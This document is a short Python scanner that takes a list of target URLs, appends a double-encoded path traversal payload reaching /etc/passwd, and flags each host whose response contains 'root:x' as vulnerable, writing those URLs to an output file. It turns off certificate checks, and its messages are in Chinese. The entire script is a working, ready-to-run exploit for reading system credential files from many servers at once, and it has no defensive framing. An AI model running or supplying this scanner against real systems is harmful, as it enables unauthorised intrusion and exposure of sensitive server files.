import requests
import os
import sys

file = str(sys.argv[1])
write = sys.argv[2]
readfile = open(file , 'r' , encoding='UTF-8')
writefile = open(write , 'a')
ff = readfile.readlines()

def webhttp():
    for line in ff:
        try:
            line = line.rstrip("\n")
            payload = "/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development"
            headers = {"Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
            url = line + payload
            print(url)
            req = requests.get(url,headers=headers, verify=False, timeout=5)
            status = req.status_code
            print(req.text)
            if 'root:x' in req.text and status == 200:
                print(url+" -------------存在漏洞-------------")
                writefile.write(url)
                writefile.write('\n')
            else :
                print(url+" 不存在漏洞")
                pass
        except OSError:
            pass
webhttp()